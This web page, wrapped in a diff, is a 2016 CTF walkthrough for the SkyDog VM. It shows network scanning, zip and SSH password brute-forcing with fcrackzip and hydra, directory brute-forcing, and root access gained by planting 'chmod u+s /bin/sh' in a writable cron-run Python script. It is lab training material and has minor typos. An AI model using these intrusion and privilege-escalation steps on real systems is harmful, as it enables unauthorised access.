@@ -1,0 +1,545 @@
+
+								
+																		Hack the SkyDog VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 9, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “SkyDog” which is design by Mr. James Bower. The purpose of this CTF is to find all six flags hidden throughout the server by the hacking network and system services. This can be achieved without hacking the VM file itself. Capturing these flags is quite fun and interesting. Before starting off I am listing the following hints of all 6 flags that we know of beforehand and we have to find out their answers.
+Flag #1 Home Sweet Home or (A Picture is worth a Thousand Words)
+Flag #2 When do Androids Learn to Walk?
+Flag #3 Who Can You Trust?
+Flag #4 Who Doesn’t Love a Good Cocktail Party?
+Flag #5 another Day at the Office
+Flag #6 Little Black Box
+Penetrating Methodologies:
+
+Network Scanning (Netdiscover, Nmap)
+Inspecting web services for (Flag 1, 2, 3 &amp; 4)
+Get flag 1st  from inside SkyDogCon_CTF.jpg (ExifTool)
+Get flag 2nd using robot.txt
+Get flag 3rd from whistler.zip
+Generating Dictionary for web directory (Cewl)
+Directory brute force (Dirb)
+Get flag 4th from play inside PlayTronics
+Get the .pcap file and grab an audio file (Wireshark)
+SSH Brute force Attack (Hydra)
+Spawn TTY shell of the machine and Get flag 5th (SSH login)
+Writable File privilege escalation
+Get the Root Access and Capture the flag 6th
+
+WalkThrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Our target is 192.168.1.102. Scan the target with nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.102
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.102
+					
+				
+			
+		
+
+
+As the result, we can see that port 22 and 80 are open. Therefore, open the IP in the browser. And as you can see there is nothing but the image of CTF on the webpage.
+
+Download the image and read it with ExifTool.
+
+		
+		
+			
+			
+			
+			
+exittool SkyDogCon_CTF.jpg
+			
+				
+					
+				
+					1
+				
+						exittool SkyDogCon_CTF.jpg
+					
+				
+			
+		
+
+Reading the image we will find the 1st flag.
+
+The first flag is in MD5 hash value and we will crack the hash value with online MD5 cracker. The value will make up to the word Welcome Home which is approximately close to author description for the 1st flag.
+Flag #1 Home Sweet Home or (A Picture is worth a Thousand Words)
+Flag 1: flag {abc40a2d4e023b42bd1ff04891549ae2}: Welcome Home
+
+If you will go back to nmap scan result, then you will observe there is a robot.txt file in which 15 entries are allowed and 252 are disallowed.
+ And yes! Opening it in the browser we found our 2nd flag. So let’s crack the MD5 value of the flag.
+
+On cracking the value of Flag #2 is Bots
+Flag #2 When do Androids Learn to Walk?
+Flag 2: flag {cd4f10fcba234f0e8b2f60a490c306e6}: Bots
+
+After cracking the flag #2 we explored robots.txt some more and upon opening all the allow directories one by one there was one which opened i.e. /Setec
+Here it comes up with the following image with title “Too many secrets” therefore I decided to review its source code.
+
+So with help of curl, we inspect following URL and found an /Astronomy directory from here.
+
+		
+		
+			
+			
+			
+			
+curl -v http://192.168.1.102/Setec
+			
+				
+					
+				
+					1
+				
+						curl -v http://192.168.1.102/Setec
+					
+				
+			
+		
+
+
+Now open this directory by typing URL: http://192.168.1.120/Setec/Astronomy and here, you will find whistler.zip. Download the file.
+
+This file is password protected therefore we need to find the password so that we can unzip this file. Now apply dictionary attack to find its password with the help of rockyou.txt and for that type:
+
+		
+		
+			
+			
+			
+			
+fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt Whistler.zip
+			
+				
+					
+				
+					1
+				
+						fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt Whistler.zip
+					
+				
+			
+		
+
+
+And you will find the password i.e. yourmother and now, of course, unzip the file:
+
+		
+		
+			
+			
+			
+			
+unzip whistler.zip
+			
+				
+					
+				
+					1
+				
+						unzip whistler.zip
+					
+				
+			
+		
+
+After unzipping you will find Flag #3 and some other file with a hint. First, open flag:
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+You will have your flag again in MD5 value. Crack it with similar method.
+Flag #3 Who Can You Trust?
+Flag3: flag{1871a3c1da602bf471d3d76cc60cdb9b}: yourmother
+Now open the other file:
+
+		
+		
+			
+			
+			
+			
+cat QuesttoFindCosmo.txt
+			
+				
+					
+				
+					1
+				
+						cat QuesttoFindCosmo.txt
+					
+				
+			
+		
+
+This file will give you a hint regarding OSINT.
+OSINT: Open-source intelligence (OSINT) is intelligence collected from publicly available sources. In the intelligence community (IC), the term “open” refers to overt, publicly available sources (as opposed to covert or clandestine sources); it is not related to open-source software or public intelligence.
+That means we have to find something related to OSINT. If you recall there was a similar thing in the movie Sneakers and so we will use the movie and apply the technique of cewl here. CEWL lets us create a dictionary file using a URL and here we will use the URL of the movie to help us create the dictionary file and therefore type:
+
+		
+		
+			
+			
+			
+			
+cewl --depth 1 https://www.imdb.com/title/tt0105435/trivia?ref_=tt_ql_2 -w /root/Desktop/dict.txt
+			
+				
+					
+				
+					1
+				
+						cewl --depth 1 https://www.imdb.com/title/tt0105435/trivia?ref_=tt_ql_2 -w /root/Desktop/dict.txt
+					
+				
+			
+		
+
+
+My next step is abusing web directories by using the above dictionary “dict.txt” to get some useful directories name with help of dirb command. 
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.102/ dict.txt
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.102/ dict.txt
+					
+				
+			
+		
+
+
+This command will show us the following directories:
+
+PlayTronics
+Sectec
+Astronomy
+
+We have already seen the content of Setec and Astronomy directories and so we will now explore PlayTronics.
+And to our luck, we found Flag.txt in the PlayTronics directory.
+
+We got the 4th flag from here, lest crack it to get the value of Flag# 4.
+
+Crack the flag with a similar method and you will have the Flag #4 value i.e. leroybrown
+Flag #4 Who Doesn’t Love a Good Cocktail Party?
+Flag 4 : flag{c07908a705c22922e6d416e0e1107d99}: leroybrown
+
+In PlayTronics we also found a file with .pcap extension. Open that file with Wireshark. And upon studying its data carefully you will find an audio file. Download audio file.
+
+Upon playing the file you will find it says only one word i.e. werner brandes. Now this “werner brandes” word can be our user name. So make a text file with possible combinations of username using the word “werner brandes”. Also, make a text file for passwords containing all the flag values that we just found.
+
+
+		
+		
+			
+			
+			
+			
+hydra -v -L dict.txt -P dict.txt.txt 192.168.1.102 ssh
+			
+				
+					
+				
+					1
+				
+						hydra -v -L dict.txt -P dict.txt.txt 192.168.1.102 ssh
+					
+				
+			
+		
+
+As you can observe that we had successfully grabbed the SSH username as wernerbrandes and password as leroybrown.
+
+Now that you have username and password login with SSH
+
+		
+		
+			
+			
+			
+			
+ssh wernerbrandes@192.168.1.102
+			
+				
+					
+				
+					1
+				
+						ssh wernerbrandes@192.168.1.102
+					
+				
+			
+		
+
+And fortunately, we also found Flag #5 in MD5 value.
+
+Crack it with the same method and the will turn up to be Dr. Gunter Janek
+Flag #5 another Day at the Office
+Flag 5: flag{82ce8d8f5745ff6849fa7af1473c9b35}: Dr. Gunter Janek
+
+Now let’s find a writable file and for that type:
+
+		
+		
+			
+			
+			
+			
+find / -writable -type f
+			
+				
+					
+				
+					1
+				
+						find / -writable -type f
+					
+				
+			
+		
+
+
+So we will open the sanitizer.py file with the following steps:
+
+		
+		
+			
+			
+			
+			
+cd /lib
+cd log
+nano sanitizer.py
+			
+				
+					
+				
+					123
+				
+						cd /libcd lognano sanitizer.py
+					
+				
+			
+		
+
+So here the following script was added by admin to clean up all junk file from inside /tmp and these type of files depends upon specific time interval for executions.
+
+Now replace “rm -r /tmp/*” from the following line as given below code which will enable SUID bit for /bin/sh after some time.
+
+		
+		
+			
+			
+			
+			
+os.system('chmod u+s /bin/sh')
+			
+				
+					
+				
+					1
+				
+						os.system('chmod u+s /bin/sh')
+					
+				
+			
+		
+
+
+Now let go to bin /bin/sh and try to get root access with help of the following command.
+
+		
+		
+			
+			
+			
+			
+/bin/sh
+id
+whoami
+ls
+cd BlackBox
+			
+				
+					
+				
+					12345
+				
+						/bin/shidwhoamilscd BlackBox
+					
+				
+			
+		
+
+And here is our 6th the last flag lets capture it.
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+Crack the value of the flag with the same method.
+Flag #6 Little Black Box
+Flag 6: flag {b70b205c96270be6ced772112e7dd03f}: CongratulationsYouDidIt
+HURRAYYY!!! All the six flags have been captures. And this CTF is completed.
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
